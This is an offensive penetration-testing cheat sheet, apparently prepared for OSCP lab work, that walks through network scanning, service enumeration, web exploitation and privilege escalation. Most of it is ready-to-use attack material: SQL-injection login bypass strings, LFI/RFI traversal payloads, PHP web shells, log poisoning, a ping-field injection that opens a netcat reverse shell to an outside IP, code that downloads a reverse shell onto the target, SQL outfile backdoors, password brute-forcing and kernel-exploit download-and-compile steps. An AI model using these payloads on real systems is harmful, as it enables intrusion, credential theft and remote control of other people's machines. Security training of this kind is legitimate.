- [Network Sweep]
- [Enumerate Services]
  - SMB
  - SNMP
  - SMTP
- [Investigate Other Services](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#investigate-other-services)
  -  FTP
  -  SSH
  -  HTTPS
- [Enumerating HTTP](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerating-http)
  - [Logon Page](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#logon-page)
- [Enumerate Web Application](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerate-web-application)
  - WebDAV
  - LFI
  - PHP Wrappers
  - RFI
  - WFuzz
- [SQLi]
- [OS Command Injection]
- [Remote Code Execution](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#remote-code-execution-now-for-a-shell)
  - [SQL Union Outfile](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#sql-union-outfile)
- [Buffer Overflow Dev]
- [Privilege Escalation Basics](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#privilege-escalation)
- [PrivEsc - Windows Checklist]
- [PrivEsc - Linux Checklist]

# Network Sweep


```netdiscover```  ```nbtscan -r 192.168.1.1-254```  ```nmap -sn Host Machine```

Scan every service port: 
```
nmap -p-
nmap -sV
nmap -A
nmap -sU -F/--open
nmap -p445 --scriptsafe 
```
```nc -nv 10.11.1.209 666```   interact with strange ports.

* * *



#### CHECK FOR EXPLOITS
- Run ```Searchsploit``` against all enumerated services AND google
```site:exploit-db APP VERSION```
#### Credentials
- If you find credentials (SMB/SMTP/FTP Traversal), STOP WHAT YOU
ARE DOING!! 
re-use on FTP/SSH/Web services. 

Especially SSH -
You may already have a shell!

# Enumerate Services

#### SMB
```enum4linux```

```nmblookup-A 10.11.1.31```

```smbclient -L //10.11.1.31```

```smbclient-L //RALPH -I 10.11.1.31```

```smbclient-L \\RALPH -N```

```smbclient //10.11.1.31/wwwroot```

#### SNMP
```onesixtyone 10.11.1.13```

```snmpwalk -c public -v1 10.11.1.13```
#### SMTP
- If there is an SMTP service running enumerate for usernames (after checking for exploits)

```perl smtp-user-enum.pl -M VRFY -U names.txt -t 10.1.1.236```
```-> /usr/share/seclists/usernames/Names/names.txt```

# Investigate Other Services
#### FTP/FTP 
if there is an FTP service running it is very likely it is related in some way, enumerate for creds (after checking for exploits)
- Anonymous login
- Remember FTP can be accessed via browser ```FTP://10.2.2.3/``` as well as via FTP from command line i.e.,   ```ftp 10.2.2.3```
- Directory Traversal is a likely path here…
#### Useful Directory Traversal locations:-
We are Looking for passwd files, configuration and properties files ; .ini  .cnf  logon.php ...
```
ls -alh
../boot.ini
../WINDOWS/system32/prodspec.ini
../../../../Docume~1/
ls /..//Windows\\System32\\
//xampp//
../\\Inetpub\\wwwroot
../../etc/passwd
../../../../var/www/html
/etc/httpd/conf/httpd.conf
/etc/apache/apache2.conf
```
- Attempt to enumerate files to find credentials, other services running on hidden ports, upload and execute or swap binaries to be run.  
- 
#### SSH - likely nothing except a logon vector from enumerated usernames.
```hydra -l robert -P fasttrack.txt ssh://192.168.1.20 -t 4```

#### HTTPS - Heartbleed / CRIME / Other similar attacks
- Read the actual SSL CERT to:
  - find out potential correct vhost to GET
  - is the clock skewed
  - any names that could be usernames for bruteforce/guessing.


# Enumerating HTTP
#### Web-based targets:
```Curl -i $IP/robots.txt```

```nikto -h 10.11.1.229```

```gobuster -u 10.11.1.229 -w /usr/share/seclist/Discover/Web/common.txt -s 200,204,301,302,307,403,500 -e```

  - ```/dirbuster/medium-2.3```
  
#### Browse the website: 
- Begin burpsuite and foxy proxy - ensure it is mapping
- Manually browse wegpages, based on output from nikto and gobuster
- Click ALL links, lookout for: 
  - logon page; 
  - comment field; 
  - LFI/RFI/SQLi -able URL; 
  - file upload; 
  - interactive OS injection; 
  - php files/pages able to be injected.

#### LOGON PAGE:
- For all logon pages - View ```page-source``` 
- Password guessing for default webapps (PHPMyAdmin: root/null)
- brute if you have Enumerated users
- Attempt SQLi auth bypass using ALL the queries below, for both User and Password fields
- make sure you are fuzzing the correct php file by following the authentication process in Burp:

````
Admin' OR 1=1
Admin' OR 1=1;
Admin' OR 1=1;#
Admin' OR 1=1;--
Admin' OR 1=1#
Admin' OR 1=1-- -
````

```medusa 10.11.1.229 -u admin -P passwords.txt -M http -m DIR:/printers -T 10```

```
wfuzz -u http://192.168.1.48/index.php -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "uname=admin&psw=FUZZ&btnLogin=Login"
```

```
wfuzz --hh 109 -d "myusername=admin&mypassword=FUZZ&Submit=Login" -u "http://192.168.1.20/checklogin.php" -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt
```

```
hydra -L names -P /usr/share/wordlists/fasttrack.txt 192.168.1.20 http-post-form "/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password"
```

```sqlmap -u 10.11.1.13 --crawl=1```

# Enumerate Web Application
#### Web Application target
```Curl``` and enum for versioning: OS, Server, language(s), Web Application, DB
- View page-source; commented code and webapp version
  - Search webapp version and pull it - docs and structure / or straight exploit
- Look for an interface to upload files (that includes installing plugins) - upload a webshell & browse to execute!!
  - Upload in language server native (asp or php), and give approp extension (```.jpg.html```) e.g., ```php-reverse-shell.php.gif```
  - Try a full reverse-shell first! and then a simple php call for RCE if it fails

#### WebDAV
```davtest -url http://10.11.1.229```
```
Cadaver http://10.11.1.229
put shell.txt
move shell.txt
shell.asp
```
#### LFI/RFI
Anything that has a   ```http://website/page?=foo```

We are looking for credentials similar to FTP Traversal, as well as a place to run code e.g., 
contaminate the logs with PHP script.

#### LFI
Don't forget escape characters:
```
../../../etc/passwd
../../../etc/passwd**%00**
../../../etc/passwd**%00.**
../../../etc/passwd**.html**
../../../etc/passwd**\0.php**
```

Common Obstacles:
```
..%c0%af or ..%252f
 ....// or ....\/
/etc/etc/passwd  -‘etc’ may be sanitised by php include function
POST ?page=php://input&cmd=whoami
```

PHP Filter; Useful trick for reading php pages when security is high:
```
?page=php://filter/convert.base64-encode/pg=../config.php
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

#### Other PHP wrappers:
**Expect** allows for immediate RCE (uncommon) 
```?page=expect://whoami```

**Input** allows for upload of data via POST (for RCE or reverse shell)
```?page=php://input```

POST data with ```curl``` and ```php://input```

```curl ‘http://example.com/LFI.php?page=php://input’ -d <?php system(‘whoami’);?>```

```Curl ‘http://example.com/LFI.php?page=php://input&cmd=id’ -d <?php echo shell_exec($_GET[‘cmd’]);?>```

OR Upload a reverse shell:
```<?php system('wget http://10.10.14.19/revshell.php -O /var/www/shell.php');?>```

#### Interesting File locations to try:
```
/etc/passwd | /etc/shadow
../../../boot.ini  to find out windows version
/var/www/html/config.php or similar paths to get SQL etc creds
/Inetpub/wwwroot | /var/www/html paths for web creds via php files
/etc/apache2/apache2.conf | /etc/httpd/conf/httpd.conf or server config
/proc/self/fd/xx contaminate via burp with referer
/proc/$pid/environ contaminate via burp with useragent
/proc/self/cmdline  contaminate running process memory
/var/log/messages | var/log/apache/access.log  or similar paths to contaminate logs
```

#### More Reading and Files
https://highon.coffee/blog/lfi-cheat-sheet/

https://portswigger.net/web-security/file-path-traversal

https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601

https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/

https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29

#### RFI
Have your PHP/cgi downloader ready
```<?php include $_GET['inc']; ?>``` - simplest backdoor to keep it dynamic without anything messing your output
Then you can just ```http://$IP/inc.php?inc=http://$YOURIP/bg.php``` and have full control with minimal footprint on target machine
```get phpinfo()```
For RFI you don't need null byte, simply match the file extension on the remote file, inject a ```?``` Which turns the extension into query string, use URL rewriting, etc, etc
⇒ this is important. Try **ALL** file extensions. E.g., ```http://www.example.com/badcode.php.gif```

#### Wfuzz
```wfuzz -c --hh 1819 -u "http://kioptrix3.com/index.php?system=FUZZ" -zfile,/usr/share/wfuzz/wordlist/customcon/LFI-tester.txt```

# SQLi
```www.website/gallery/gallery.php?id=1```
As well as logon auto, if you see any web app that has a gallery with pictures, any web app that seems to have a grid based page with different boxes, or any web app that can order items in any way - this is a sign of UNION SELECT
```
Union select all 1,2,3,4…
Union select all 1,2,3,4…--
Union select all 1,2,3,4…#
```
```SQL Outfile - ….into OUTFILE 'c:/xampp/htdocs/backdoor.php'--```

https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

#### Comment field - XSS
XSS attempts:
```<script>alert(‘test’);</script>```

# OS Command Injection
Exploiting web interface ping.php to make OS Calls     
PING HOST: ```127.0.0.1& nc 10.10.10.1 443 -e /bin/bash```
Shell Meta-Character Examples:
#### Windows and Unix
```
& whoami 	
&& whoami
| whoami 
|| whoami
%0a+whoami   _ (“\n” new line character)_
```
#### Unix
```
; whoami
%0d+whoami    (“\r” carriage return character)
```
#### Windows
```
%1a+whoami   (magic windows character)
```
#### Unix-only inline execution of an injected command within the original command
```
`whoami`
$(whoami)
```
https://portswigger.net/web-security/os-command-injection


# Remote Code Execution… now for a shell
#### PHP In-Line Shell
```<?php echo shell_exec($_GET['cmd']);?>```

```<?php echo system($_REQUEST['cmd']); ?>```

```<?php echo "\n\n"; passthru($_GET['cmd']); ?>```

#### Log Contamination 
Contaminate log files with the php shell, with netcat or burp repeater; the following are good locations:
```
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/proc/self/fd/xx
/proc/self/environ
https://www.exploit-db.com/papers/12886
```

#### SQL union outfile 
```
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

```
cat revshell.php | xxd -ps | tr -d '\n'

Select 0x178d35c2348e79f238794ab134689a in outfile /var/www/html/shell.php
```



# Buffer Overflow - Exploit Development
Determine buffer needed to crash application.
Find a CPU register to overwrite with ‘B’s via pattern - this will be your jump
```msf_Pattern_create -l 2900```
Determine when register is being overwritten
```msf-pattern_offset -l 2900 -q 39694458```
Pad the rest with Cs to fill the buffer - this will be your shellcode 
```Buffer = “A”*2606 + “B”*4 + “C”*(2900-2606-4)```
Determine badchars to make sure all of your payload is getting through
```mona! bytearray```
Develop exploit - find a loaded DLL (user32.dll?) without ASLR or DEP (and no bad characters!)
Is the payload right at ESP?
```JMP ESP → !mona find -s “\xff\xe4” -m loaded.dll```
Is the payload before ESP?
```sub ESP, 200 and then JMP ESP```
Or
```call [ESP-200]```

```
msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -b “\x0\x04\x2f\x3a” -o filename
```

Make sure it fits your payload length above

# Privilege Escalation 

#### Linux
searchsploit CentOS 4. | grep /local/ (look for kernel version)
searchsploit linux kernel 4.4.0 | grep 16.04 (search by kernel, grep for release)
Transfer and compile on target machine to account for dependencies
wget http://192.168.1.223/9495.c -P /var/tmp
gcc -o centos45 9495.c 
chmod +x centos45
./centos45

#### Windows
Searchsploit ??? | grep /local/ (look for?)
windows-exploit-suggester.py -d 2019-05-17-mssb.xls -i sysinfo
Windows local exploit must be compiled on Kali with:
i686-w64-mingw32-gcc ms11-046.c -lws2_32 -o adfsys.exe 
cscript wget.vbs http://10.11.0.148/adfsys.exe -O C:\lec\go.exe
icacls adfsys.exe /grant NINA\nina:(M)

smbserver.py leshare /var/www/html/scripts/
copy \\10.10.14.19\leshare\Powerless.bat
Powerless.bat > \\10.10.14.19\leshare\powerOUT.txt

# Priv-Esc Basic Enumeration
#### Quick Wins - Credentials from (Web) Service files
If web services were running and was an avenue to enter (or not), check the webroot! Especially if there was a Logon Page - the checklogin.php file must have a mechanism to access the SQL database to authenticate users.. Check it 
grep -r -i “password” /var/www/
Examples:
/var/www/https/wproot/wp-config.php
/var/www/html/check_logon.php
Bash History is also good to read through
find /home/ -type f -iname ".bash_history" -exec cat {} \;
Thoroughly enumerate User folders
/home/bob/
C:\Users\Bob
#### Other Services
Database - is MySQL running as root? 
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
https://www.exploit-db.com/exploits/1518 (linux)
https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
select sys_exec('usermod -a -G admin john');
If running third-party FTP, SMTP or something in the name of the machine!, maybe check those folders out.. Looking for .conf and .ini and passwd files.
#### Scripts
Windows
https://github.com/M4ximuss/Powerless
https://github.com/GDSSecurity/Windows-Exploit-Suggester
Linux
https://github.com/sleventyeleven/linuxprivchecker/
